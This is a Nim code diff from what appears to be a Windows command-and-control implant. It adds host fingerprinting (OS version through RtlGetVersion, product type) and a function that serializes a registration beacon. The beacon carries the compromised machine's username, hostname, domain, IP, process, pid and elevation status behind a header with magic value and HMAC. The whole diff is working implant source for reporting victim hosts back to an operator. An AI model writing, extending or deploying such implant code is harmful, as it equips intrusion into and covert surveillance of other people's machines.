@@ -1,7 +1,6 @@
 import winim, os, net, strformat, strutils, registry
 
-import ../agentTypes
-import ../../../common/[types, utils]
+import ../../../common/[types, serialize, utils]
 
 # Hostname/Computername
 proc getHostname*(): string = 
@@ -69,7 +68,28 @@ proc getIPv4Address*(): string =
     return $getPrimaryIpAddr()
 
 # Windows Version fingerprinting
-proc getWindowsVersion*(info: agentTypes.OSVersionInfoExW, productType: ProductType): string =
+type 
+    ProductType* = enum
+        UNKNOWN = 0
+        WORKSTATION = 1
+        DC = 2
+        SERVER = 3
+
+# API Structs
+type OSVersionInfoExW* {.importc: "OSVERSIONINFOEXW", header: "<windows.h>".} = object
+    dwOSVersionInfoSize*: ULONG
+    dwMajorVersion*: ULONG
+    dwMinorVersion*: ULONG
+    dwBuildNumber*: ULONG
+    dwPlatformId*: ULONG
+    szCSDVersion*: array[128, WCHAR]
+    wServicePackMajor*: USHORT
+    wServicePackMinor*: USHORT
+    wSuiteMask*: USHORT
+    wProductType*: UCHAR
+    wReserved*: UCHAR
+
+proc getWindowsVersion*(info: OSVersionInfoExW, productType: ProductType): string =
     let
         major = info.dwMajorVersion
         minor = info.dwMinorVersion
@@ -152,11 +172,11 @@ proc getProductType(): ProductType =
 
 proc getOSVersion*(): string = 
     
-    proc rtlGetVersion(lpVersionInformation: var agentTypes.OSVersionInfoExW): NTSTATUS
+    proc rtlGetVersion(lpVersionInformation: var OSVersionInfoExW): NTSTATUS
         {.cdecl, importc: "RtlGetVersion", dynlib: "ntdll.dll".}
 
     when defined(windows):
-        var osInfo: agentTypes.OSVersionInfoExW
+        var osInfo: OSVersionInfoExW
         discard rtlGetVersion(osInfo)
         # echo $int(osInfo.dwMajorVersion)
         # echo $int(osInfo.dwMinorVersion)
@@ -172,13 +192,13 @@ proc getOSVersion*(): string =
     else:
         return "Unknown"
 
-proc getRegistrationData*(config: AgentConfig): AgentRegistrationData = 
+proc collectAgentMetadata*(config: AgentConfig): AgentRegistrationData = 
     
     return AgentRegistrationData(
         header: Header(
             magic: MAGIC,
             version: VERSION, 
-            packetType: cast[uint8](MSG_RESPONSE),
+            packetType: cast[uint8](MSG_REGISTER),
             flags: cast[uint16](FLAG_PLAINTEXT),
             seqNr: 1'u32, # TODO: Implement sequence tracking
             size: 0'u32,
@@ -198,3 +218,40 @@ proc getRegistrationData*(config: AgentConfig): AgentRegistrationData =
             sleep: cast[uint32](config.sleep)
         )
     )
+
+proc serializeRegistrationData*(data: AgentRegistrationData): seq[byte] = 
+
+    var packer = initPacker()
+
+    # Serialize registration data
+    packer 
+        .add(data.metadata.agentId)
+        .add(data.metadata.listenerId)
+        .addVarLengthMetadata(data.metadata.username)
+        .addVarLengthMetadata(data.metadata.hostname)
+        .addVarLengthMetadata(data.metadata.domain)
+        .addVarLengthMetadata(data.metadata.ip)
+        .addVarLengthMetadata(data.metadata.os)
+        .addVarLengthMetadata(data.metadata.process)
+        .add(data.metadata.pid)
+        .add(data.metadata.isElevated)
+        .add(data.metadata.sleep)
+
+    let metadata = packer.pack()
+    packer.reset()
+
+    # TODO: Encrypt metadata
+
+    # Serialize header
+    packer
+        .add(data.header.magic)
+        .add(data.header.version)
+        .add(data.header.packetType)
+        .add(data.header.flags)
+        .add(data.header.seqNr) 
+        .add(cast[uint32](metadata.len))
+        .addData(data.header.hmac)
+
+    let header = packer.pack()
+
+    return header & metadata
